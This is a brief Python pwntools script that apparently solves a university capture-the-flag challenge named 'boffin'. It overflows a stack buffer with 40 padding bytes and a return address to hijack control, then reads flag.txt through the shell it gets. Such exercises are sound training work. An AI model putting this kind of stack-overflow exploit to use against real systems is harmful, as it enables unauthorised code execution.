from pwn import *

#p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1337)
p = process("./boffin")
print p.recvuntil(":")
p.sendline("jm5833")
print p.recvuntil("?")
p.sendline('a' * 40 + p64(0x40069d))
print p.recvline()
p.sendline("cat flag.txt")
print p.recvuntil('}')
